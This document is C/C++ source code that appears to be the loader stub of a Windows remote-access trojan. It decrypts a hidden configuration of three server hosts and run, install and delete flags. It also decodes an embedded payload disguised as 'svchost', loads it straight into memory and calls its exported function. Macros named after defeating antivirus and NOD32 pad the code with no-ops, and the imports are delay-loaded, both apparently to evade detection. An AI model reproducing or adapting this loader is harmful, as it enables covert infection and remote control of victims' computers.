// #include <windows.h>
// #include <shlwapi.h>
#include "MemoryModule.h"
#include "resource.h"
#include "des.h"
#include "C_svchost.h"
typedef int (WINAPI *PFN_POPMSGBOX)(void);
#pragma comment(linker, "/OPT:NOWIN98")
#define ANTIVIRUS  _asm nop;
#define FUCKNOD32  _asm nop;
#define FUCKAV     Sleep(0);
#define FUCKAV2      _asm nop;
/********************隐式输出表*************************************/
#pragma comment(linker, "/DELAYLOAD:WININET.dll")
#pragma comment(linker, "/DELAYLOAD:WS2_32.dll")
#pragma comment(linker, "/DELAYLOAD:PSAPI.DLL")
#pragma comment(linker, "/DELAYLOAD:GDI32.dll")
#pragma comment(linker, "/DELAYLOAD:ADVAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:SHELL32.dll")
#pragma comment(linker, "/DELAYLOAD:SHLWAPI.dll")
#pragma comment(linker, "/DELAYLOAD:MSVFW32.dll")
#pragma comment(linker, "/DELAYLOAD:WINMM.dll")
#pragma comment(linker, "/DELAYLOAD:USER32.dll")
#pragma comment(linker, "/DELAYLOAD:WTSAPI32.dll")
#pragma comment(linker, "/DELAYLOAD:IMM32.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:USER32.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:ADVAPI32.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:WS2_32.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:IPHLPAPI.dll")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")

typedef struct _THREADDATA2
{
    char Host1[128];
    char Host2[128];
    char Host3[128];
    char Group[64];
    char Ver[64];
    char Time[64];
	bool Run;
	bool Key;
	bool Del;
}*LPTHREADDATA2, THREADDATA2;



struct Server_Data 
{
	unsigned int finder;
	char Host1[128];
	char Host2[128];
	char Host3[128];
	char Group[64];
	char Ver[64];
	char Time[64];
	bool Run;
	bool Key;
	bool Del;
}
server_data = 
{
	0xFFFFFF8D,
		"",
		"",
		"",
		"",
		"",
		false,
		false,
		false,
};

extern "C" _declspec(dllexport) LPVOID Hai()
{

	DES des;
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
	char Key[]={'D','e','n','g','\0'};
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV2
        FUCKAV2
		_asm nop;
	_asm nop;
	_asm nop;
   _asm nop;
    des.Des_Go((char *)&server_data,(char *)&server_data,sizeof(server_data),Key,strlen(Key),DECRYPT);
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
        FUCKAV2
	LPTHREADDATA2 pData = new THREADDATA2;
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV2
        FUCKAV2
	wsprintf(pData->Host1,server_data.Host1);
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
        FUCKAV2
	wsprintf(pData->Host2,server_data.Host2);
   	ANTIVIRUS
		FUCKAV2
		FUCKAV2
        FUCKAV2
	wsprintf(pData->Host3,server_data.Host3);
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV2
        FUCKAV2
        FUCKAV2
		FUCKAV2
        FUCKAV2
        FUCKAV2
	wsprintf(pData->Group,server_data.Group);
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
		_asm nop;
	_asm nop;
	_asm nop;
   _asm nop;
	wsprintf(pData->Ver,server_data.Ver);
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
	wsprintf(pData->Time,server_data.Time);
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
    pData->Run=server_data.Run;
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
    pData->Key=server_data.Key;
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
    pData->Del=server_data.Del;
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
        FUCKAV2
		_asm nop;
	_asm nop;
	_asm nop;
   _asm nop;
	return (LPVOID)pData;
}


void EncryptData(unsigned char *szRec, unsigned long nLen, unsigned long key)
{
	_asm nop;
	unsigned long i;
	unsigned char p;
		_asm nop;
	p = (unsigned char ) key % 254 +8;
	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
        FUCKAV2
	for(i = 0; i < nLen; i++) 
	{
		ANTIVIRUS
			FUCKNOD32
        FUCKAV2
		ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV
		FUCKAV2
			FUCKAV2
		*szRec ^= p;
		*szRec += p;
		szRec++;
		FUCKAV
			_asm nop;
		_asm nop;
		_asm nop;
   _asm nop;
			FUCKAV2
			FUCKAV2
		FUCKAV2
			FUCKAV2
        FUCKAV2
	}


}

void LoadDllFromMemAndCall( const char *name)
{
	_asm nop;
   	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
		FUCKNOD32
		FUCKAV
		FUCKAV2
				FUCKAV
			FUCKAV2
			FUCKAV2
			_asm nop;
	_asm nop;
	_asm nop;
   _asm nop;
	//16进制
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize;
	PVOID DllResourceModule=NULL;
	HMEMORYMODULE hDll;
	PFN_POPMSGBOX pfn;
 	EncryptData((unsigned char *)svchostMyFileBuf,svchostMyFileSize,2025);

    	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV2
        FUCKAV2
 	hDll=MemoryLoadLibrary(svchostMyFileBuf);
		_asm nop;
		_asm nop;
		_asm nop;
   _asm nop;
		ANTIVIRUS
			FUCKNOD32
			FUCKAV
		ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
	if (hDll==NULL)
	{
		ANTIVIRUS
			FUCKNOD32
			FUCKAV
			FUCKAV2
			FUCKAV2
			FUCKAV2

		return ;
	}
	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
	pfn=MemoryGetProcAddress(hDll,name);
	if (pfn==NULL)
	{
		MemoryFreeLibrary(hDll);
		return;
	}
	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
	ANTIVIRUS
	FUCKNOD32
	FUCKAV
	FUCKAV2
	FUCKAV
	FUCKAV2
	FUCKAV2
        FUCKAV2
	pfn();
	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV
		FUCKAV2
        FUCKAV2
	if (hDll!=NULL)
	{
		MemoryFreeLibrary(hDll);
		hDll=NULL;
	}
}


int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
 	// TODO: Place code here.

		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
		FUCKAV
		FUCKAV2
		FUCKAV2
        FUCKAV2
        char Host[]={'M','e','\0'};
    	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKNOD32
		FUCKAV2
        FUCKAV2
    	ANTIVIRUS
		FUCKNOD32
		FUCKAV
		FUCKAV2
		FUCKAV2
		FUCKAV2
		FUCKAV2
        FUCKAV2
ANTIVIRUS
FUCKAV2
		FUCKAV
		_asm nop;
		_asm nop;
		_asm nop;
   _asm nop;
		FUCKAV2
		FUCKAV2
        FUCKAV2
	LoadDllFromMemAndCall(Host);
		ANTIVIRUS
	return 0;

}